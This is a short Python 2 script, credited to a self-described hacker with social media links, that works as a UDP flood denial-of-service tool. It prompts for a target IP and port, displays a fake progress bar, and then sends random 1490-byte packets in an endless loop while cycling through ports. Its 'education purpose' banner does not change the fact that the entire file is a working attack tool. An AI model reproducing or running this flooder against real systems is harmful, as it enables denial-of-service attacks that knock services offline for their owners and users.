import sys
import random
from datetime import datetime
import time
import socket
import os

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("apt install figlet")
os.system("clear")
os.system("figlet DDOS")
os.system("echo $'\e[1;33m' PLEASE USE THIS SCRIPT FOR EDUCATION PURPOSE'\e[0m'")

print
print "Author   : abbakarhacker"
print "You Tube : https://www.youtube.com/c/hausahackers"
print "github   : https://github.com/abbakarhacker"
print "Facebook : https://www.facebook.com/abdullahiabubakar"
print "Twitter  : https://www.twitter.com/mrcyberhater"
print "website  :https://hausahackers.org"
print


ip = raw_input("IP Target : ")
port = input("Port      : ")


os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(3)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

